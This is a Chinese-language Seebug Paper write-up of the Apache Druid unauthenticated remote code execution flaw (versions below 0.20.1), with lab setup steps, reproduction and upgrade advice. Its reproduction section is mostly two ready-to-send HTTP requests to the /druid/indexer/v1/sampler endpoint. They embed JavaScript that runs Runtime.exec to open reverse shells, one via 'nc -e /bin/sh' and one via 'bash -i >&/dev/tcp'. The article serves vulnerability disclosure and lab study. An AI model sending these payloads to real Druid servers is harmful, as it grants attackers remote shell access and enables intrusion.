@@ -1,0 +1,93 @@
+**作者：Ja0k  
+本文为作者投稿，Seebug Paper 期待你的分享，凡经采用即有礼品相送！  
+投稿邮箱：paper@seebug.org**
+
+### 一.漏洞概要
+
+Apache Druid 是用Java编写的面向列的开源分布式数据存储，旨在快速获取大量事件数据，并在数据之上提供低延迟查询。  
+Apache Druid 默认情况下缺乏授权认证，攻击者可以发送特制请求，利用Druid服务器上进程的特权执行任意代码。
+
+### 二.影响范围
+
+影响版本： Apache Druid < 0.20.1  
+安全版本： Apache Druid 0.20.1
+
+### 三.环境搭建
+
+<https://github.com/apache/druid/>  
+<https://druid.apache.org/docs/latest/tutorials/index.html>  
+下载0.19版本  
+<https://github.com/apache/druid/releases/tag/druid-0.19.0>  
+解压  
+cd druid-druid-0.19.0-rc1\distribution\docker  
+docker-compose up -d  
+打开 <http://192.168.123.10:8888>  
+
+![](https://images.seebug.org/content/images/2021/02/03/1612328003000-image.png-w331s)
+
+### 四.漏洞复现
+
+Poc1：通用
+
+    
+    
+    POST /druid/indexer/v1/sampler HTTP/1.1
+    Host: 192.168.123.10:8888
+    Accept: application/json, text/plain, */*
+    DNT: 1
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
+    Referer: http://192.168.123.10:8888/unified-console.html
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+    Content-Type: application/json
+    Connection: close
+    Content-Length: 1007
+    
+    {"type": "index", "spec": {"ioConfig": {"type": "index", "inputSource": {"type": "inline", "data": "{\"isRobot\":true,\"channel\":\"#x\",\"timestamp\":\"2020-12-12T12:10:21.040Z\",\"flags\":\"x\",\"isUnpatrolled\":false,\"page\":\"1\",\"diffUrl\":\"https://xxx.com\",\"added\":1,\"comment\":\"Botskapande Indonesien omdirigering\",\"commentLength\":35,\"isNew\":true,\"isMinor\":false,\"delta\":31,\"isAnonymous\":true,\"user\":\"Lsjbot\",\"deltaBucket\":0,\"deleted\":0,\"namespace\":\"Main\"}"}, "inputFormat": {"type": "json", "keepNullColumns": true}}, "dataSchema": {"dataSource": "sample", "timestampSpec": {"column": "timestamp", "format": "iso"}, "dimensionsSpec": {}, "transformSpec": {"transforms": [], "filter": {"type": "javascript", "dimension": "added", "function": "function(value) {java.lang.Runtime.getRuntime().exec('nc 192.168.123.10 5555 -e /bin/sh')}", "": {"enabled": true}}}}, "type": "index", "tuningConfig": {"type": "index"}}, "samplerConfig": {"numRows": 500, "timeoutMs": 15000}}
+
+![](https://images.seebug.org/content/images/2021/02/e9cd0e5a-c165-406f-8312-74c17f73c8fd.png-w331s)
+
+注意：因为是docker环境没有bash，这里直接采用nc -e反弹
+
+Poc2：通用
+
+    
+    
+    ![image (2)](image (2).png)POST /druid/indexer/v1/sampler?for=example-manifest HTTP/1.1
+    Host: 0.0.0.0:8888
+    Content-Length: 1005
+    Accept: application/json, text/plain, */*
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
+    DNT: 1
+    Content-Type: application/json;charset=UTF-8
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+    Connection: close
+    
+    {"type":"index","spec":{"type":"index","ioConfig":{"type":"index","inputSource":{"type":"http","uris":["https://druid.apache.org/data/example-manifests.tsv"]},"inputFormat":{"type":"tsv","findColumnsFromHeader":true}},"dataSchema":{"dataSource":"sample","timestampSpec":{"column":"timestamp","missingValue":"2010-01-01T00:00:00Z"},"dimensionsSpec":{},"transformSpec":{"transforms":[],"filter":{"type": "javascript",
+                                            "function": "function(value){return java.lang.Runtime.getRuntime().exec('/bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/0.0.0.0/5555 0>&1')}",
+                                            "dimension": "added",
+                                            "": {
+                                                    "enabled": "true"
+                                            }
+                                    }
+                            }
+      },"type":"index","tuningConfig":{"type":"index"}},"samplerConfig":{"numRows":50,"timeoutMs":10000}}
+
+![](https://images.seebug.org/content/images/2021/02/16233732-d7dd-4614-a480-6eaa9a5d4adb.png-w331s)
+
+### 五.修复建议
+
+升级至安全版本及其以上。
+
+### 参考
+
+<https://www.hedysx.com/2732.html>  
+<https://xz.aliyun.com/t/9176>  
+<https://www.t00ls.net/thread-59631-1-1.html>
+
+* * *
+
+![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
+本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1476/>
+
